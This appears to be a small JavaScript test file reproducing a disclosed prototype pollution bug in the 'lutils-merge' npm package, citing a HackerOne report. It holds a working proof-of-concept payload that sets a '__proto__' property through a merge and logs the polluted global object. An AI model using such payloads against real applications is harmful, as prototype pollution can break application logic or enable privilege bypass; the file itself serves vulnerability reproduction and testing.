// //https://hackerone.com/reports/439107
// test("prototype pollution in lutils-merge", () => {
  const merge = require("lutils-merge");
  const payload = '{"__proto__":{"polluted":"yes"}}';
  obj = {};

console.log({}.polluted);

  merge({}, JSON.parse(payload));
console.log({}.polluted);
// });
